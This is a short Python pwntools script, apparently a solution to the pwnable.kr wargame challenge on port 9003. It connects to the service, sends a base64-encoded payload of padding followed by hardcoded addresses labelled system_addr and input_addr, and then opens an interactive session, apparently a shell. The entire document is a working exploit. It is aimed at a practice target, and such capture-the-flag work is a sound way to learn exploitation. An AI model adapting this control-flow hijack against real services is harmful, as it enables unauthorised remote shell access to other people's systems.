from pwn import *

def poc_exploit():
	
	#connect
	conn = remote('pwnable.kr', 9003)
	conn.recvline(False, 1)
	#send data
	input_addr = 0x0811eb40
	system_addr = 0x08049284
	str = b64e('a'*4 + p32(system_addr) + p32(input_addr))

	conn.sendline(str)
	
	line = conn.recvline()
	print line
	conn.interactive()


if __name__ == '__main__':
	poc_exploit()
